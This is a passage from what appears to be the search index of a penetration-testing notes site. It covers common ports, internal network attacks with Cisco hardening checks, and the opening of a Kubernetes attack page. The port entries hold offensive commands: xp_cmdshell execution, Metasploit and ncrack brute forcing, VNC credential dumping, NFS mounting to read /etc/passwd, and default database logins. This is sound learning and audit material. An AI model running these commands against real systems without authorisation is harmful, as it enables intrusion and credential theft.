open on mx-servers. Servers that are meant to send and recieve email. Related ports: 110 is the POP3 non-encrypted. 25, 465","title":"Port 995 - POP3 Encrypten"},{"location":"attacking_internal_network/list_of_common_ports/#port-1025-nfs-or-iis","text":"I have seen them open on windows machine. But nothing has been listening on it.","title":"Port 1025 - NFS or IIS"},{"location":"attacking_internal_network/list_of_common_ports/#port-1030103210331038","text":"I think these are used by the RPC within Windows Domains. I have found no use for them so far. But they might indicate that the target is part of a Windows domain. Not sure though.","title":"Port 1030/1032/1033/1038"},{"location":"attacking_internal_network/list_of_common_ports/#port-1433-mssql","text":"Default port for Microsoft SQL . sqsh -S 192.168.1.101 -U sa","title":"Port 1433 - MsSQL"},{"location":"attacking_internal_network/list_of_common_ports/#execute-commands","text":"# To execute the date command to the following after logging in xp_cmdshell 'date' go Many o the scanning modules in metasploit requires authentication. But some do not. use auxiliary/scanner/mssql/mssql_ping","title":"Execute commands"},{"location":"attacking_internal_network/list_of_common_ports/#brute-force","text":"scanner/mssql/mssql_login If you have credencials look in metasploit for other modules.","title":"Brute force."},{"location":"attacking_internal_network/list_of_common_ports/#port-1521-oracle-database","text":"Enumeration tnscmd10g version -h 192.168.1.101 tnscmd10g status -h 192.168.1.101 Bruteforce the ISD auxiliary/scanner/oracle/sid_brute Connect to the database with sqlplus References: http://www.red-database-security.com/wp/itu2007.pdf","title":"Port 1521 - Oracle database"},{"location":"attacking_internal_network/list_of_common_ports/#ports-1748-1754-1808-1809-oracle","text":"These are also ports used by oracle on windows. They run Oracles Intelligent Agent .","title":"Ports 1748, 1754, 1808, 1809 - Oracle"},{"location":"attacking_internal_network/list_of_common_ports/#port-2049-nfs","text":"Network file system This is a service used so that people can access certain parts of a remote filesystem. If this is badly configured it could mean that you grant excessive access to users. If the service is on its default port you can run this command to see what the filesystem is sharing showmount -e 192.168.1.109 Then you can mount the filesystem to your machine using the following command mount 192.168.1.109:/ /tmp/NFS mount -t 192.168.1.109:/ /tmp/NFS Now we can go to /tmp/NFS and check out /etc/passwd, and add and remove files. This can be used to escalate privileges if it is not correct configured. Check chapter on Linux Privilege Escalation.","title":"Port 2049 - NFS"},{"location":"attacking_internal_network/list_of_common_ports/#port-2100-oracle-xml-db","text":"There are some exploits for this, so check it out. You can use the default Oracle users to access to it. You can use the normal ftp protocol to access it. Can be accessed through ftp. Some default passwords here: https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm Name: Version: Default logins: sys:sys scott:tiger","title":"Port 2100 - Oracle XML DB"},{"location":"attacking_internal_network/list_of_common_ports/#port-3268-globalcatldap","text":"","title":"Port 3268 - globalcatLdap"},{"location":"attacking_internal_network/list_of_common_ports/#port-3306-mysql","text":"Always test the following: Username: root Password: root mysql --host=192.168.1.101 -u root -p mysql -h <Hostname> -u root mysql -h <Hostname> -u root@localhost mysql -h <Hostname> -u \"\"@localhost telnet 192.168.0.101 3306 You will most likely see this a lot: ERROR 1130 (HY000): Host '192.168.0.101' is not allowed to connect to this MySQL server This occurs because mysql is configured so that the root user is only allowed to log in from 127.0.0.1. This is a reasonable security measure put up to protect the database.","title":"Port 3306 - MySQL"},{"location":"attacking_internal_network/list_of_common_ports/#configuration-files","text":"cat /etc/my.cnf http://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html","title":"Configuration files"},{"location":"attacking_internal_network/list_of_common_ports/#mysql-commands-cheat-sheet","text":"http://cse.unl.edu/~sscott/ShowFiles/SQL/CheatSheet/SQLCheatSheet.html","title":"Mysql-commands cheat sheet"},{"location":"attacking_internal_network/list_of_common_ports/#uploading-a-shell","text":"You can also use mysql to upload a shell","title":"Uploading a shell"},{"location":"attacking_internal_network/list_of_common_ports/#escalating-privileges","text":"If mysql is started as root you might have a chance to use it as a way to escalate your privileges.","title":"Escalating privileges"},{"location":"attacking_internal_network/list_of_common_ports/#mysql-udf-injection","text":"https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/","title":"MYSQL UDF INJECTION:"},{"location":"attacking_internal_network/list_of_common_ports/#finding-passwords-to-mysql","text":"You might gain access to a shell by uploading a reverse-shell. And then you need to escalate your privilege. One way to do that is to look into the databse and see what users and passwords that are available. Maybe someone is resuing a password? So the first step is to find the login-credencials for the database. Those are usually found in some configuration-file oon the web-server. For example, in joomla they are found in: /var/www/html/configuration.php In that file you find the <?php class JConfig { var $mailfrom = 'admin@example.com'; var $fromname = 'testuser'; var $sendmail = '/usr/sbin/sendmail'; var $password = 'myPassowrd1234'; var $sitename = 'test'; var $MetaDesc = 'Joomla! - the dynamic portal engine and content management system'; var $MetaKeys = 'joomla, Joomla'; var $offline_message = 'This site is down for maintenance. Please check back again soon.'; }","title":"Finding passwords to mysql"},{"location":"attacking_internal_network/list_of_common_ports/#port-3339-oracle-web-interface","text":"","title":"Port 3339 - Oracle web interface"},{"location":"attacking_internal_network/list_of_common_ports/#port-3389-remote-desktop-protocol","text":"This is a proprietary protocol developed by windows to allow remote desktop. Log in like this rdesktop -u guest -p guest 10.11.1.5 -g 94% Brute force like this ncrack -vv --user Administrator -P /root/passwords.txt rdp://192.168.1.101","title":"Port 3389 - Remote Desktop Protocol"},{"location":"attacking_internal_network/list_of_common_ports/#ms12-020","text":"This is categorized by microsoft as a RCE vulnerability. But there is no POC for it online. You can only DOS a machine using this exploit.","title":"Ms12-020"},{"location":"attacking_internal_network/list_of_common_ports/#port-4445-upnotifyp","text":"I have not found anything here. Try connecting with netcat and visiting in browser.","title":"Port 4445 - Upnotifyp"},{"location":"attacking_internal_network/list_of_common_ports/#port-4555-rsip","text":"I have seen this port being used by Apache James Remote Configuration. There is an exploit for version 2.3.2 https://www.exploit-db.com/docs/40123.pdf","title":"Port 4555 - RSIP"},{"location":"attacking_internal_network/list_of_common_ports/#5060-5061-sip","text":"PBX - Public branch exchange A private phone exchange, usually found inside a company for example. Trunk - Connects a PBX with the rest of the telephone-network. Lync is being rebranded to Skype for business. So today it is basically the same thing. Asterix is a software implementation of a PBX. Session Initiation Protocol (SIP). SIP V 2.0 is standardized in RFC 3261: https://tools.ietf.org/html/rfc3261. It has since then changed a bit in other RFCs. SIP communicates over TCP/UDP and SCTP. It uses port 5060 for unencrypted traffic and 5061 for encrypted. SIP is just phones over the IP network. - A Client is usually called a SIP User Agent . In order for one user agent to call another both need to listen on their ports, usually 5060 or 5061. However, how would one user that is trying to call another user know at which IP address that user is at?","title":"5060 / 5061 - SIP"},{"location":"attacking_internal_network/list_of_common_ports/#flow-of-a-call-within-a-domain","text":"Step 1. Register So the first step for a client is to send the above mentioned registration data to the registrar. So lets say that both our callers boot up their sip-phones. On boot they send their AOR and ip address to the registrar It works like this. When a user boot up its phone/client, that client will send a message to the Registrar . The message contains the device Address of Record (AOA). The AOR has this format: SIP:user@domain . And the client will also send its contact address, ie its ip address. So it will send it like this: sip:1003@company.com sip:192.168.11.1:5060 Step 2. Invitation So when the userA wants to call userB, he sends an INVITE to the LOCATION service, which knows the ip address of userB. So it proxies the call to the userB. Step 3. Response UserB picks up the phone, and his ip-address is sent through the LOCATION service, to UserA. So now userA has userB:s ip address. So the fundamental components here are: Registrar service SIP registry (the database with the clients info) Location Service","title":"Flow of a call within a domain"},{"location":"attacking_internal_network/list_of_common_ports/#flow-of-a-call-outside-of-the-domain","text":"So the client registrar his AOR to his local SIP server. The SIP server, or SIP proxy, looks up the AOR for the recipient, but can't find it. So it looks at the domain: 1999@othercompany.se So it performs a lookup to othercompany.se, finds the ip-adress and the direct the INVITE to that server.","title":"Flow of a call outside of the domain"},{"location":"attacking_internal_network/list_of_common_ports/#calling-a-non-ip-phone","text":"So is it possible to call a non-ip phone? Yes. For that you can use a Signalling gateway. Signall protocol translator. Example of those are SS7. But you need a a translator, that translates from SIP to Public switched telephone netowkr (PSTN).","title":"Calling a non-ip phone"},{"location":"attacking_internal_network/list_of_common_ports/#protocol-level-analysis","text":"So, let's look at exchange between two user agents/client. This is a scenario where they are on the same network and know each others ip. ALICE is calling BOB. ALice INVITE ----> BOB Alice <---- 100 Trying BOB Alice <---- 180 Ringing BOB Alice <---- 200 OK BOB Alice ACK ----> BOB ALICE DATA <-----> DATA BOB Alice hangs up Alice BYE ----> BOB Alice <---- 200 OK BOB","title":"Protocol level analysis"},{"location":"attacking_internal_network/list_of_common_ports/#port-5357-wsdapi","text":"","title":"Port 5357 - WSDAPI"},{"location":"attacking_internal_network/list_of_common_ports/#port-5722-dfsr","text":"The Distributed File System Replication (DFSR) service is a state-based, multi-master file replication engine that automatically copies updates to files and folders between computers that are participating in a common replication group. DFSR was added in Windows Server 2003 R2. I am not sure how what can be done with this port. But if it is open it is a sign that the machine in question might be a Domain Controller.","title":"Port 5722 - DFSR"},{"location":"attacking_internal_network/list_of_common_ports/#port-5900-vnc","text":"VNC is used to get a screen for a remote host. But some of them have some exploits. You can use vncviewer to connect to a vnc-service. Vncviewer comes built-in in Kali. It defaults to port 5900. You do not have to set a username. VNC is run as a specific user, so when you use VNC it assumes that user. Also note that the password is not the user password on the machine. If you have dumped and cracked the user password on a machine does not mean you can use them to log in. To find the VNC password you can use the metasploit/meterpreter post exploit module that dumps VNC passwords background use post/windows/gather/credentials/vnc set session X exploit vncviewer 192.168.1.109","title":"Port 5900 - VNC"},{"location":"attacking_internal_network/list_of_common_ports/#ctr-alt-del","text":"If you are unable to input ctr-alt-del (kali might interpret it as input for kali). Try shift-ctr-alt-del","title":"Ctr-alt-del"},{"location":"attacking_internal_network/list_of_common_ports/#metasploit-scanner","text":"You can scan VNC for logins, with bruteforce. Login scan use auxiliary/scanner/vnc/vnc_login set rhosts 192.168.1.109 run Scan for no-auth use auxiliary/scanner/vnc/vnc_none_auth set rhosts 192.168.1.109 run","title":"Metasploit scanner"},{"location":"attacking_internal_network/list_of_common_ports/#port-8080","text":"Since this port is used by many different services. They are divided like this.","title":"Port 8080"},{"location":"attacking_internal_network/list_of_common_ports/#tomcat","text":"Tomcat suffers from default passwords. There is even a module in metasploit that enumerates common tomcat passwords. And another module for exploiting it and giving you a shell.","title":"Tomcat"},{"location":"attacking_internal_network/list_of_common_ports/#port-9389-","text":"Active Directory Administrative Center is installed by default on Windows Server 2008 R2 and is available on Windows 7 when you install the Remote Server Administration Tools (RSAT).","title":"Port 9389 -"},{"location":"attacking_internal_network/network_attacks/","text":"About the Components # Switch - Layer 2 device # A switch basically has table that maps the MAC address of a device to the port of the switch. This table is called a CAM table. Using this table it can forward traffic without the traffic having to go through a router. Backbone/core/tandem switch is a switch with high capacity located in the physical core of the network. A backbone switch serves to interconnect edge switches. A core switch can sometimes operate on layer 3. Aggregation switches are usually connected to the core switch. It can have routing features as well. A normal port on a core switch might handle up to 10Gbps. You might connect the core switch to the aggregation switches using fiber, since those cables will carry a lot of traffic. The core switch usually server as a gateway to the WAN. Aggregation/distribution switch - basically a switch that servers as a connection between a core switch and an edge switch. Access/edge/normal switch - smaller capacity that are on the edges of the network. Usually used to connect end devices, like a computer. Router - layer 3 device # A router is a layer 3 device. While a switch is a layer 2 device. Therefore you won't find subnets configured on a switch, but you will find it on a router. Since the router deals with layer 3 (IP) VLAN # A VLAN is fundamentally a layer 2 virtual lan. This means that it does not concern IP-addresses, as one might initially think. We usually think of a VLAN as a subnet. But a VLAN is a layer 2 segmentation, and subnet is a layer 3. However, it is common with a one-to-one relationship between a VLAN and a subnet. That is: VLAN 10 is related to 192.168.11.1/24 . This is why you might enter a cisco switch and you won't find subnet information. On cisco router show vlans will show the IP-address. On a switch however show vlans does not exist. A VLAN is simply a tag that is added to each ethernet frame. That is why a switch does not really need to look at traffic above the ethernet frame. This tag is the IEEE 802.1Q header (also known as Dot1q ) of the ethernet frame. However if you sniff the traffic on your computer you will likely not see the Dot1q tag, because it is removed when sent to the end user. It is only used between switches, I think. A basic switch that does not have VLANs enabled will have a default VLAN enabled that contains all the ports of the switch. The default VLAN usually uses the ID 1. A trunk is a network link that carries multiple VLANs. In cisco world the word channel is sometimes used to say trunk. Protocols and terminology # HSRP # Hot Standby Router Protocol (HSRP) is a cisco protocol which provides redudancy for a local subnet. In HSRP two or more routers gives an illusion of one virtual router. It allows you to configure one router to be the active router, and others to be the standby router. All routers in a single HSRP group share a MAC address and IP address. The active router is responsible for forwarding the traffic, if that router fails the standby router takes over. SNMP - Simple Network Management Protocol # SNMP is a protocol used to manage and monitor network devices. SNMP is used to monitor your network. It does this by sending out messages to devices on the network that speak SNMP. These are SNMP get-requests. Managed device - the device that can be queried for information. Agent - the service/agent running on a device that collects the data that can be queried over SNMP. Network Managemet station VRF - Virtual Routing and Forwarding # VRF is used to create many virtual routing tables. A typical example would be ISP's using same router to route traffic for various customers and configure VRF to separate the various customer traffics with the router. Some Network Attacks # VLAN hopping using DTP # Background # A switch has a number of ports. Those ports can be either access port or trunking port . An access port is usually used when connecting a host to the switch. Just like a regular computer. Each access port is assigned one VLAN, and only one. A trunking port is used when conneting two switches or connecting a switch and a router. Trunking ports allow traffic from multiple lans. A trunk port can be configured manually. But there is also a protocol that can do this over the network, Dynamic Trunk Protocol. So, as you can understand the attack is to transform the access port that you are connected to into a trunking port, in order to be able to access other VLANS. So an attack can be performed against ports that are configured to be dynamic desirable , dynamic auto , or trunk mode. A port can be in a number of different states: AUTO - if the port is configured to listen for DTP frames it can convert the port to a trunk port of the other switch decides sends the DTP frame. DESIRABLE - DTP is spoken to the neighbor switch with the desire that the other switch form a trunk. ON - Attack # Since it is a protocol an attacker can simply send a DTP packet and instruct the switch to becomes a trunk. If an attacker is successfull it will turn that port into a trunk. Cisco insecure password type # Background # There exists multiple password types in Cisco. The passwords can be stored in a number of different ways, or Types as cisco calls them. Type 0 is plaintext. Etc. Type 9 is the secure version. Passwords are stored in configurations and can be read with commands like show running-config Username Check that it is using type 9. show running-config | incl username Check that it is using \"secret 9\" HSRP Check for usage of encrypted password for HSRP. ALthough this is pretty shitty security. show standby SNMP TACTACS Look for the tactac-configuration. Check that it is key 7. show running-config server-private 1.1.1.1 key 7 45weg45345345345 BGP Weak password # In some protocols a password is used. You need to make sure that the password is not superweak. If you run show running-config You can check for passwords and see if they are really weak. They might be encrypted, but if they are of type 7 they can easily be decrypted. BGP For example, with BGP it is possible to configure BGP peer authentication. BGP authentication can be used by entering the neighbor command in cisco. It will look something like this: show running-config neighbor 8.8.9.1 password 7 1511021F0725 Password 7 means that it is is encrypted. But it can easily be decrypted by anyone. It is just to store the password in non-plaintext. But the password will be hashed into MD5 when used with BGP. So if it uses password 7 there is nothing really to complain about, but what you can do is simply decrypt it and check that the password is not very weak. You can do this with this script: https://github.com/theevilbit/ciscot7/blob/master/ciscot7.py SNMP Community string is just another word for password. The default community string is public or private. This should be set to something else. show running-config | incl snmp SNMP Configurations # Check for weak/default passwords # How to do that can be found in the section about weak passwords. Check for read write # CIS 1.5.4 SNMP should not be used in Read write mode unless absolutley necessary. Check for RW whe you run the following command. show run | incl snmp-server community Check for ACL on SNMP # CIS 1.5.5 Exploiting spanning-tree protocol # Background # STP is a layer 2 protocol. STP is used to prevent layer 2 switching loops. It does so by shutting down redudant links. So say you have two links between two switches. STP makes sure that you in fact only have one, so that a packet won't enter into a loop. Redudant links are however important to server at a backup. If two links are active at the same time it will create a loop. If a switch recive a unicast, multicast or broadcast. These frames will be forwarded to all ports on the switch except for the port it recieved the frame on. This means that the frame will be sent to another switch, which will send it back to the first swich. Thereby creating a loop. An infinite loop is sometimes called a broadcast storm . STP activly monitors all links on the network. It uses an algorithm called spanning-tree algorithm in order to find redudant links. The protocol disabled redudant links. STP decides on which switch should be the root bridge. It does this by looking at bridge priority value. On cisco this is always 32768. Root Bridge - The switch that is the root in the spanning tree Root Port - All switches choose a root port. which is the port with the lowest cost to the root bridge. Ports that do not participate in the tree are blocked. In order to implement STP you need to specify your most centralized switch to be the root. This is often the core/backbone switch. Exploit # So since STP is just a protocol that switches uses, and there is no authentication you might see where this is going. An attacker can simply set itself to become the root bridge, this means that the other switches would forward traffic to your host. An attacker can flood the network with BPDU packets advertising that your own host has the lowest bridge cost. You can also advertise your link of having a lower cost. This will direct traffic through you. These attacks can be performed with yersinia . You should probably look up how much traffic might be sent over your link. Note that you might bring down the network if you perform this attack. How to check for # show spanning-tree summary Root Guard Checking for root guard has to be done on each port show interface summary show spanning-tree interface TenGigabitEthernet1/0/4 detail This syntax is also possible: show spanning-tree interface Te1/0/4 detail If it says \"Root guard is enabled on the port\" Root guard is enabled, if it doesn't say anything I think it means that is is not enabled. Recommendation # For Cisco devices that are primarpily two defence mechanisms against these attacks: Root Guard and BPDU Guard. BPDU guard is enabled on a switch, and root guard on a port basis. References # https://flylib.com/books/en/3.418.1.75/1/ Patch level # Background # Cisco devices are very prone to security issues. How to check # Check which version of the OS the device is running. show version ARP spoofing / ARP poisoning # Background # One classic attack is called ARP poisoning. Recommendation # Enable Dynamic ARP Inspection Rouge DHCP attack # Background # Recommendation # Enable DHCP snooping IP/MAC spoofing # Background # Recommendation # Can be prevented by IP source guard - in Cisco IPv6 Man in the middle # Background # Recommendation # IPv6 Router Advertisment Guard can be used to protect. CAM overflow attack # Background # Switches work by building a reference table between a switch port and a MAC address. Based on the destination MAC address the switch knows which port to send the traffic to. This table is called context-addressable memory (CAM) table. The switch can only hold a limited amount of MAC addresses in this table. An attacker can abuse this by performing a CAM overflow attack. The attacker mimics the existence of thousdands of random MAC addresses on one (or more) ports. The switch enters all these MAC addresses in the CAM table, and eventually the table overflows. Since the table is full the switch doesn't can't know where to send other traffic, legitimate traffic. So the switch turns into a hub, and sends the traffic out to all hosts that are connected to the switch. This allows an attacker to sniff traffic performed by other users. DHCP starvation attacks #","title":"Network Attacks"},{"location":"attacking_internal_network/network_attacks/#about-the-components","text":"","title":"About the Components"},{"location":"attacking_internal_network/network_attacks/#switch-layer-2-device","text":"A switch basically has table that maps the MAC address of a device to the port of the switch. This table is called a CAM table. Using this table it can forward traffic without the traffic having to go through a router. Backbone/core/tandem switch is a switch with high capacity located in the physical core of the network. A backbone switch serves to interconnect edge switches. A core switch can sometimes operate on layer 3. Aggregation switches are usually connected to the core switch. It can have routing features as well. A normal port on a core switch might handle up to 10Gbps. You might connect the core switch to the aggregation switches using fiber, since those cables will carry a lot of traffic. The core switch usually server as a gateway to the WAN. Aggregation/distribution switch - basically a switch that servers as a connection between a core switch and an edge switch. Access/edge/normal switch - smaller capacity that are on the edges of the network. Usually used to connect end devices, like a computer.","title":"Switch - Layer 2 device"},{"location":"attacking_internal_network/network_attacks/#router-layer-3-device","text":"A router is a layer 3 device. While a switch is a layer 2 device. Therefore you won't find subnets configured on a switch, but you will find it on a router. Since the router deals with layer 3 (IP)","title":"Router - layer 3 device"},{"location":"attacking_internal_network/network_attacks/#vlan","text":"A VLAN is fundamentally a layer 2 virtual lan. This means that it does not concern IP-addresses, as one might initially think. We usually think of a VLAN as a subnet. But a VLAN is a layer 2 segmentation, and subnet is a layer 3. However, it is common with a one-to-one relationship between a VLAN and a subnet. That is: VLAN 10 is related to 192.168.11.1/24 . This is why you might enter a cisco switch and you won't find subnet information. On cisco router show vlans will show the IP-address. On a switch however show vlans does not exist. A VLAN is simply a tag that is added to each ethernet frame. That is why a switch does not really need to look at traffic above the ethernet frame. This tag is the IEEE 802.1Q header (also known as Dot1q ) of the ethernet frame. However if you sniff the traffic on your computer you will likely not see the Dot1q tag, because it is removed when sent to the end user. It is only used between switches, I think. A basic switch that does not have VLANs enabled will have a default VLAN enabled that contains all the ports of the switch. The default VLAN usually uses the ID 1. A trunk is a network link that carries multiple VLANs. In cisco world the word channel is sometimes used to say trunk.","title":"VLAN"},{"location":"attacking_internal_network/network_attacks/#protocols-and-terminology","text":"","title":"Protocols and terminology"},{"location":"attacking_internal_network/network_attacks/#hsrp","text":"Hot Standby Router Protocol (HSRP) is a cisco protocol which provides redudancy for a local subnet. In HSRP two or more routers gives an illusion of one virtual router. It allows you to configure one router to be the active router, and others to be the standby router. All routers in a single HSRP group share a MAC address and IP address. The active router is responsible for forwarding the traffic, if that router fails the standby router takes over.","title":"HSRP"},{"location":"attacking_internal_network/network_attacks/#snmp-simple-network-management-protocol","text":"SNMP is a protocol used to manage and monitor network devices. SNMP is used to monitor your network. It does this by sending out messages to devices on the network that speak SNMP. These are SNMP get-requests. Managed device - the device that can be queried for information. Agent - the service/agent running on a device that collects the data that can be queried over SNMP. Network Managemet station","title":"SNMP - Simple Network Management Protocol"},{"location":"attacking_internal_network/network_attacks/#vrf-virtual-routing-and-forwarding","text":"VRF is used to create many virtual routing tables. A typical example would be ISP's using same router to route traffic for various customers and configure VRF to separate the various customer traffics with the router.","title":"VRF - Virtual Routing and Forwarding"},{"location":"attacking_internal_network/network_attacks/#some-network-attacks","text":"","title":"Some Network Attacks"},{"location":"attacking_internal_network/network_attacks/#vlan-hopping-using-dtp","text":"","title":"VLAN hopping using DTP"},{"location":"attacking_internal_network/network_attacks/#background","text":"A switch has a number of ports. Those ports can be either access port or trunking port . An access port is usually used when connecting a host to the switch. Just like a regular computer. Each access port is assigned one VLAN, and only one. A trunking port is used when conneting two switches or connecting a switch and a router. Trunking ports allow traffic from multiple lans. A trunk port can be configured manually. But there is also a protocol that can do this over the network, Dynamic Trunk Protocol. So, as you can understand the attack is to transform the access port that you are connected to into a trunking port, in order to be able to access other VLANS. So an attack can be performed against ports that are configured to be dynamic desirable , dynamic auto , or trunk mode. A port can be in a number of different states: AUTO - if the port is configured to listen for DTP frames it can convert the port to a trunk port of the other switch decides sends the DTP frame. DESIRABLE - DTP is spoken to the neighbor switch with the desire that the other switch form a trunk. ON -","title":"Background"},{"location":"attacking_internal_network/network_attacks/#attack","text":"Since it is a protocol an attacker can simply send a DTP packet and instruct the switch to becomes a trunk. If an attacker is successfull it will turn that port into a trunk.","title":"Attack"},{"location":"attacking_internal_network/network_attacks/#cisco-insecure-password-type","text":"","title":"Cisco insecure password type"},{"location":"attacking_internal_network/network_attacks/#background_1","text":"There exists multiple password types in Cisco. The passwords can be stored in a number of different ways, or Types as cisco calls them. Type 0 is plaintext. Etc. Type 9 is the secure version. Passwords are stored in configurations and can be read with commands like show running-config Username Check that it is using type 9. show running-config | incl username Check that it is using \"secret 9\" HSRP Check for usage of encrypted password for HSRP. ALthough this is pretty shitty security. show standby SNMP TACTACS Look for the tactac-configuration. Check that it is key 7. show running-config server-private 1.1.1.1 key 7 45weg45345345345 BGP","title":"Background"},{"location":"attacking_internal_network/network_attacks/#weak-password","text":"In some protocols a password is used. You need to make sure that the password is not superweak. If you run show running-config You can check for passwords and see if they are really weak. They might be encrypted, but if they are of type 7 they can easily be decrypted. BGP For example, with BGP it is possible to configure BGP peer authentication. BGP authentication can be used by entering the neighbor command in cisco. It will look something like this: show running-config neighbor 8.8.9.1 password 7 1511021F0725 Password 7 means that it is is encrypted. But it can easily be decrypted by anyone. It is just to store the password in non-plaintext. But the password will be hashed into MD5 when used with BGP. So if it uses password 7 there is nothing really to complain about, but what you can do is simply decrypt it and check that the password is not very weak. You can do this with this script: https://github.com/theevilbit/ciscot7/blob/master/ciscot7.py SNMP Community string is just another word for password. The default community string is public or private. This should be set to something else. show running-config | incl snmp","title":"Weak password"},{"location":"attacking_internal_network/network_attacks/#snmp-configurations","text":"","title":"SNMP Configurations"},{"location":"attacking_internal_network/network_attacks/#check-for-weakdefault-passwords","text":"How to do that can be found in the section about weak passwords.","title":"Check for weak/default passwords"},{"location":"attacking_internal_network/network_attacks/#check-for-read-write","text":"CIS 1.5.4 SNMP should not be used in Read write mode unless absolutley necessary. Check for RW whe you run the following command. show run | incl snmp-server community","title":"Check for read write"},{"location":"attacking_internal_network/network_attacks/#check-for-acl-on-snmp","text":"CIS 1.5.5","title":"Check for ACL on SNMP"},{"location":"attacking_internal_network/network_attacks/#exploiting-spanning-tree-protocol","text":"","title":"Exploiting spanning-tree protocol"},{"location":"attacking_internal_network/network_attacks/#background_2","text":"STP is a layer 2 protocol. STP is used to prevent layer 2 switching loops. It does so by shutting down redudant links. So say you have two links between two switches. STP makes sure that you in fact only have one, so that a packet won't enter into a loop. Redudant links are however important to server at a backup. If two links are active at the same time it will create a loop. If a switch recive a unicast, multicast or broadcast. These frames will be forwarded to all ports on the switch except for the port it recieved the frame on. This means that the frame will be sent to another switch, which will send it back to the first swich. Thereby creating a loop. An infinite loop is sometimes called a broadcast storm . STP activly monitors all links on the network. It uses an algorithm called spanning-tree algorithm in order to find redudant links. The protocol disabled redudant links. STP decides on which switch should be the root bridge. It does this by looking at bridge priority value. On cisco this is always 32768. Root Bridge - The switch that is the root in the spanning tree Root Port - All switches choose a root port. which is the port with the lowest cost to the root bridge. Ports that do not participate in the tree are blocked. In order to implement STP you need to specify your most centralized switch to be the root. This is often the core/backbone switch.","title":"Background"},{"location":"attacking_internal_network/network_attacks/#exploit","text":"So since STP is just a protocol that switches uses, and there is no authentication you might see where this is going. An attacker can simply set itself to become the root bridge, this means that the other switches would forward traffic to your host. An attacker can flood the network with BPDU packets advertising that your own host has the lowest bridge cost. You can also advertise your link of having a lower cost. This will direct traffic through you. These attacks can be performed with yersinia . You should probably look up how much traffic might be sent over your link. Note that you might bring down the network if you perform this attack.","title":"Exploit"},{"location":"attacking_internal_network/network_attacks/#how-to-check-for","text":"show spanning-tree summary Root Guard Checking for root guard has to be done on each port show interface summary show spanning-tree interface TenGigabitEthernet1/0/4 detail This syntax is also possible: show spanning-tree interface Te1/0/4 detail If it says \"Root guard is enabled on the port\" Root guard is enabled, if it doesn't say anything I think it means that is is not enabled.","title":"How to check for"},{"location":"attacking_internal_network/network_attacks/#recommendation","text":"For Cisco devices that are primarpily two defence mechanisms against these attacks: Root Guard and BPDU Guard. BPDU guard is enabled on a switch, and root guard on a port basis.","title":"Recommendation"},{"location":"attacking_internal_network/network_attacks/#references","text":"https://flylib.com/books/en/3.418.1.75/1/","title":"References"},{"location":"attacking_internal_network/network_attacks/#patch-level","text":"","title":"Patch level"},{"location":"attacking_internal_network/network_attacks/#background_3","text":"Cisco devices are very prone to security issues.","title":"Background"},{"location":"attacking_internal_network/network_attacks/#how-to-check","text":"Check which version of the OS the device is running. show version","title":"How to check"},{"location":"attacking_internal_network/network_attacks/#arp-spoofing-arp-poisoning","text":"","title":"ARP spoofing / ARP poisoning"},{"location":"attacking_internal_network/network_attacks/#background_4","text":"One classic attack is called ARP poisoning.","title":"Background"},{"location":"attacking_internal_network/network_attacks/#recommendation_1","text":"Enable Dynamic ARP Inspection","title":"Recommendation"},{"location":"attacking_internal_network/network_attacks/#rouge-dhcp-attack","text":"","title":"Rouge DHCP attack"},{"location":"attacking_internal_network/network_attacks/#background_5","text":"","title":"Background"},{"location":"attacking_internal_network/network_attacks/#recommendation_2","text":"Enable DHCP snooping","title":"Recommendation"},{"location":"attacking_internal_network/network_attacks/#ipmac-spoofing","text":"","title":"IP/MAC spoofing"},{"location":"attacking_internal_network/network_attacks/#background_6","text":"","title":"Background"},{"location":"attacking_internal_network/network_attacks/#recommendation_3","text":"Can be prevented by IP source guard - in Cisco","title":"Recommendation"},{"location":"attacking_internal_network/network_attacks/#ipv6-man-in-the-middle","text":"","title":"IPv6 Man in the middle"},{"location":"attacking_internal_network/network_attacks/#background_7","text":"","title":"Background"},{"location":"attacking_internal_network/network_attacks/#recommendation_4","text":"IPv6 Router Advertisment Guard can be used to protect.","title":"Recommendation"},{"location":"attacking_internal_network/network_attacks/#cam-overflow-attack","text":"","title":"CAM overflow attack"},{"location":"attacking_internal_network/network_attacks/#background_8","text":"Switches work by building a reference table between a switch port and a MAC address. Based on the destination MAC address the switch knows which port to send the traffic to. This table is called context-addressable memory (CAM) table. The switch can only hold a limited amount of MAC addresses in this table. An attacker can abuse this by performing a CAM overflow attack. The attacker mimics the existence of thousdands of random MAC addresses on one (or more) ports. The switch enters all these MAC addresses in the CAM table, and eventually the table overflows. Since the table is full the switch doesn't can't know where to send other traffic, legitimate traffic. So the switch turns into a hub, and sends the traffic out to all hosts that are connected to the switch. This allows an attacker to sniff traffic performed by other users.","title":"Background"},{"location":"attacking_internal_network/network_attacks/#dhcp-starvation-attacks","text":"","title":"DHCP starvation attacks"},{"location":"attacking_kubernetes/attacking_kubernetes/","text":"Introduction # Managed vs unmanaged # A good thing to ask the customer is if they are running a managed or unmanaged cluster. That is, is the cluster managed by gcloud (GKE), AWS (EKS), or Microsoft (AKS), or some other cloud-provider? If it is, it's a bit less likely that some of the configuration mistakes are made. It also means that the administrators of the cluster might have less ability to manage the cluster themselves. How much of the cluster that is managed depends on the cloud provider. They might be responsible for updating kubernetes, and configure the Master node, and only let the customer control the worker nodes. In GKE for example, the Control Plane is managed by Gcloud, and the worker nodes are managed by the customer. The Control Plane (Cluster Master/ Master Node) is essentially a black box to the administrator. Another managed kubernetes provider is Rancher. A drawback of using a managed cluster is that you might not have access to all features that is available in a unmanaged cluster. If you run an unmanaged cluster you will have access to the master node, and you will be repsonsible for updating kubernetes. Some terminology # Kubernetes API This API is accessible on port 6443 or 443 (GCE, and other Cloud providers usually run it on port 443, while the default is on 6443) on the master node. It is the API that kubectl uses, and through it you managed the desired state of your cluster. If you have high priviliges to the API you own the cluster. It is with this API that you defined things such as: what pods to run, how many replicas, what network and disk resources you want to make available. The API is the single source of truth. The API is sometimes referred to as kube-apiserver because that is the name of the server running on the Cluster master. Kubernetes Control Plane The Control Plane is in charge of putting your cluster in the state that you configured through the Kubernetes API. The term Control Plane is kind of an umberella term to combine several processes running on the master and worker nodes. The Kubernetes Master is a set of three processes that are running on your Master Node. Those processes are: kube-apiserver , kube-controller-manager , and kube-scheduler . Each non-master node runs the following processes: kubelet and kube-proxy . The kubelet process communicates with the Kubernetes Master. The kube-proxy is a network proxy which reflects Kubernetes networking services on each node. Master node aka Cluster master The master node usually runs these 